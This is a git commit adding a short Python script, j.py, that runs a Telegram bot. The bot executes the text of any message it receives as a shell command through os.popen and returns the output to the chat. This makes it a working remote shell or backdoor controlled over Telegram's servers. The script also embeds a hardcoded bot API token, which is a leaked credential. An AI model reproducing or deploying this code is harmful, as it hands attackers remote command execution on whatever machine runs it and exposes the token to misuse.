3080f08914d7d6f2db3fedf98bd971601f45ed92
Dex <128259345+Mr3nter9@users.noreply.github.com>
2023-07-14 00:56:44 +0300

    Add files via upload

---
+++ j.py
@@ -0,0 +1,16 @@
+import os
+import telebot
+bot=telebot.TeleBot('6165670532:AAGtDdFpAVLCNiPAiuM_euW09HSTbgT_KdU')
+def cmd(c):
+    x = os.popen(c).readlines()
+    return x
+@bot.message_handler(func=lambda message: True)
+def getall(message):
+    try:
+        c = message.text
+        n=cmd(c)
+        bot.send_message(message.chat.id,n)
+    except Exception:
+        pass
+
+bot.polling()
